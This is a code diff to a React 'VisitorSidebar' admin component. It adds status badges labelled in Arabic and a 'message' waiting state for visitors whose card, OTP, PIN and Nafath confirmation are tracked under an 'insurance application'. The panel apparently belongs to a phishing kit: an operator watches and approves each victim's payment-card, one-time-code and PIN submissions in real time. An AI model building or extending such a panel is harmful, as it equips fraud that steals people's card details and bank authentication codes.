@@ -36,10 +36,28 @@ interface VisitorSidebarProps {
 const isWaitingForAdmin = (visitor: InsuranceApplication): boolean => {
   return (
     visitor.cardStatus === "waiting" ||
+    visitor.cardStatus === "message" ||
     visitor.otpStatus === "waiting" ||
     visitor.pinStatus === "waiting" ||
     visitor.nafadConfirmationStatus === "waiting"
   );
+};
+
+const getCardStatusBadge = (status: InsuranceApplication["cardStatus"]) => {
+  switch (status) {
+    case "approved_with_otp":
+      return { label: "✓ OTP", cls: "bg-emerald-100 text-emerald-700 border border-emerald-200" };
+    case "approved_with_pin":
+      return { label: "✓ PIN", cls: "bg-emerald-100 text-emerald-700 border border-emerald-200" };
+    case "rejected":
+      return { label: "✗ مرفوض", cls: "bg-red-100 text-red-600 border border-red-200" };
+    case "message":
+      return { label: "📲 رسالة", cls: "bg-amber-100 text-amber-700 border border-amber-200 animate-pulse" };
+    case "waiting":
+      return { label: "⏳ انتظار", cls: "bg-yellow-100 text-yellow-700 border border-yellow-200" };
+    default:
+      return null;
+  }
 };
 
 // Get current page name in Arabic
@@ -341,6 +359,14 @@ export function VisitorSidebar({
                             بطاقة
                           </span>
                         )}
+                        {(() => {
+                          const badge = getCardStatusBadge(visitor.cardStatus);
+                          return badge ? (
+                            <span className={`rounded-full px-2 py-0.5 text-[10px] font-semibold whitespace-nowrap ${badge.cls}`}>
+                              {badge.label}
+                            </span>
+                          ) : null;
+                        })()}
                       </div>
 
                       {/* Time ago + Block */}
